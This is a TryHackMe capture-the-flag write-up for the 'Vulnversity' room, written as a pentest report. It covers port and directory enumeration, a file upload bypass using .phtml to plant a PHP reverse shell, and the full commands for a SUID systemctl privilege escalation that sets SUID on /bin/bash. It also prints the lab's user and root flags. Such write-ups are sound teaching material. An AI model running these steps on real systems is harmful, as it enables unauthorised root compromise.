# Vulnversity – TryHackMe Writeup

## Overview

This report documents the compromise of the **Vulnversity** TryHackMe machine through a combination of web enumeration, file upload abuse, remote code execution, and privilege escalation via a misconfigured SUID binary.

The objective was to identify exposed services, exploit a vulnerable file upload functionality, gain initial access to the target system, escalate privileges, and obtain both user and root flags.

---

# Target Information

| Field     | Value         |
| --------- | ------------- |
| Target IP | 10.49.175.142 |
| Platform  | TryHackMe     |
| Room Name | Vulnversity   |

---

# Executive Summary

During the assessment, multiple weaknesses were identified that allowed an attacker to progress from unauthenticated access to full root compromise.

The attack chain involved:

1. Enumerating network services.
2. Discovering a hidden web directory.
3. Identifying a vulnerable file upload functionality.
4. Bypassing file extension restrictions.
5. Uploading a malicious reverse shell.
6. Gaining remote code execution as **www-data**.
7. Enumerating SUID binaries.
8. Exploiting a misconfigured SUID **systemctl** binary.
9. Escalating privileges to root.
10. Obtaining the root flag.

---

# Methodology

The assessment followed a standard penetration testing methodology:

* Reconnaissance
* Enumeration
* Initial Access
* Remote Code Execution
* Privilege Escalation
* Credential Discovery

---

# Phase 1 – Reconnaissance

## Host Discovery

### Command

```bash
ping 10.49.175.142
```

### Findings

The target responded to ICMP requests, confirming network connectivity.

### Observation

```text
TTL = 62
```

The TTL value suggested that the target was likely running a Linux-based operating system.

---

# Phase 2 – Network Enumeration

## Initial Port Scan

### Command

```bash
nmap 10.49.175.142
```

### Result

```text
All 1000 scanned ports closed
```

### Analysis

The initial scan did not reveal any open ports despite the host being reachable.

A more aggressive scan was performed with host discovery disabled.

---

## SYN Scan

### Command

```bash
nmap -sS -Pn 10.49.175.142
```

### Results

| Port | Service     |
| ---- | ----------- |
| 21   | FTP         |
| 22   | SSH         |
| 139  | NetBIOS     |
| 445  | SMB         |
| 3128 | Squid Proxy |
| 3333 | HTTP        |

---

## Service Enumeration

### Command

```bash
nmap -sV 10.49.175.142
```

### Results

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 21   | FTP     | vsftpd 3.0.5  |
| 22   | SSH     | OpenSSH 8.2p1 |
| 139  | SMB     | Samba smbd 4  |
| 445  | SMB     | Samba smbd 4  |
| 3128 | Proxy   | Squid 4.10    |
| 3333 | HTTP    | Apache 2.4.41 |

### Analysis

The web service running on port **3333** was selected as the primary attack surface for further investigation.

---

# Phase 3 – Web Enumeration

## Directory Discovery

### Command

```bash
gobuster dir \
-u http://10.49.175.142:3333 \
-w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

### Results

```text
/images
/css
/js
/internal
```

### Analysis

The `/internal` directory appeared to be intended for administrative or development purposes and warranted further investigation.

---

# Phase 4 – File Upload Enumeration

## Upload Functionality Discovery

Browsing to:

```text
http://10.49.175.142:3333/internal
```

revealed a file upload form.

### Analysis

File upload functionality is frequently targeted because improper validation can lead to arbitrary file upload and remote code execution vulnerabilities.

---

## Extension Fuzzing

To determine which file types were permitted, the upload request was intercepted using Burp Suite and sent to Intruder.

### Tested Extensions

```text
png
jpg
jpeg
php
php3
php4
php5
phtml
```

### Result

The application rejected most executable file types but accepted:

```text
phtml
```

### Security Impact

The application relied on inadequate extension filtering, allowing a server-side executable file to bypass validation controls.

---

# Phase 5 – Initial Access

## Reverse Shell Creation

A PHP reverse shell payload was created and saved with a permitted extension:

```text
reverse.phtml
```

### Upload

The payload was uploaded successfully through the file upload functionality.

### Result

```text
Success
```

---

## Uploaded File Discovery

Navigating to:

```text
http://10.49.175.142:3333/internal/uploads
```

revealed the uploaded file.

### Analysis

The uploads directory allowed direct access to uploaded files, enabling execution of the malicious payload.

---

## Netcat Listener

### Command

```bash
nc -nvlp 1234
```

### Triggering the Reverse Shell

The uploaded payload was executed by visiting:

```text
http://10.49.175.142:3333/internal/uploads/reverse.phtml
```

### Result

A reverse shell connection was established.

```text
uid=33(www-data)
```

### Verification

```bash
whoami
```

### Output

```text
www-data
```

---

# Phase 6 – User Flag Discovery

## User Enumeration

### Commands

```bash
cd /home
ls
```

### Result

```text
bill
ubuntu
```

---

## Reading User Flag

### Command

```bash
cat /home/bill/user.txt
```

### Result

```text
8bd7992fbe8a6ad22a63361004cfcedb
```

---

# Phase 7 – Privilege Escalation Enumeration

## SUID Enumeration

### Command

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Interesting Finding

```text
/bin/systemctl
```

### Analysis

The presence of a SUID-enabled systemctl binary represented a significant privilege escalation opportunity.

According to GTFOBins, systemctl can be abused to create and execute services with root privileges.

---

# Phase 8 – Privilege Escalation

## Upgrading the Shell

### Command

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Creating a Malicious Service

### Commands

```bash
TF=/tmp/root.service

echo '[Unit]' > $TF
echo 'Description=rootshell' >> $TF

echo '[Service]' >> $TF
echo 'Type=oneshot' >> $TF
echo 'ExecStart=/bin/chmod u+s /bin/bash' >> $TF

echo '[Install]' >> $TF
echo 'WantedBy=multi-user.target' >> $TF
```

### Service Contents

```text
[Unit]
Description=rootshell

[Service]
Type=oneshot
ExecStart=/bin/chmod u+s /bin/bash

[Install]
WantedBy=multi-user.target
```

---

## Registering the Service

### Command

```bash
/bin/systemctl link /tmp/root.service
```

### Result

```text
Created symlink
```

---

## Starting the Service

### Command

```bash
/bin/systemctl enable --now root.service
```

### Result

The service executed successfully and modified the permissions on `/bin/bash`.

---

## Verification

### Command

```bash
ls -l /bin/bash
```

### Result

```text
-rwsr-xr-x
```

### Analysis

The SUID bit had been applied successfully.

---

## Obtaining a Root Shell

### Command

```bash
/bin/bash -p
```

### Verification

```bash
whoami
```

### Output

```text
root
```

### Result

Privilege escalation was successful.

---

# Phase 9 – Root Flag Discovery

## Accessing the Root Directory

### Commands

```bash
cd /root
ls
```

### Result

```text
root.txt
```

---

## Reading the Root Flag

### Command

```bash
cat root.txt
```

### Result

```text
a58ff8579f0a9270368d33a9966c7fd5
```

---

# Attack Chain

```text
Directory Enumeration
        ↓
/internal
        ↓
File Upload Form
        ↓
Extension Fuzzing
        ↓
.phtml Allowed
        ↓
Upload Reverse Shell
        ↓
Execute Payload
        ↓
www-data Access
        ↓
SUID Enumeration
        ↓
systemctl Identified
        ↓
Create Malicious Service
        ↓
Set SUID on Bash
        ↓
Root Shell
```

---

# Findings & Vulnerabilities

| ID   | Finding                                                 | Severity |
| ---- | ------------------------------------------------------- | -------- |
| F-01 | Unrestricted File Upload Vulnerability                  | High     |
| F-02 | Inadequate File Extension Validation                    | High     |
| F-03 | Remote Code Execution via Uploaded Web Shell            | Critical |
| F-04 | Misconfigured SUID Permission on systemctl              | Critical |
| F-05 | Privilege Escalation Through Malicious Service Creation | Critical |

---

# Tools Used

### Enumeration

* Nmap
* Gobuster

### Web Exploitation

* Burp Suite
* PHP Reverse Shell

### Remote Access

* Netcat

### Privilege Escalation

* GTFOBins
* systemctl

---

# Flags Obtained

| Flag      | Value                            |
| --------- | -------------------------------- |
| User Flag | 8bd7992fbe8a6ad22a63361004cfcedb |
| Root Flag | a58ff8579f0a9270368d33a9966c7fd5 |

---

# Conclusion

The compromise of the target system was achieved through a chain of vulnerabilities involving improper file upload validation and a dangerous SUID configuration.

By enumerating the web application, it was possible to identify a file upload functionality that permitted execution of files with the `.phtml` extension. This weakness enabled remote code execution as the web server user. Subsequent enumeration revealed a SUID-enabled `systemctl` binary, which was abused to create and execute a malicious service as root, resulting in complete system compromise.

The assessment demonstrates how inadequate input validation and privilege management can be chained together to achieve full administrative access to a system.
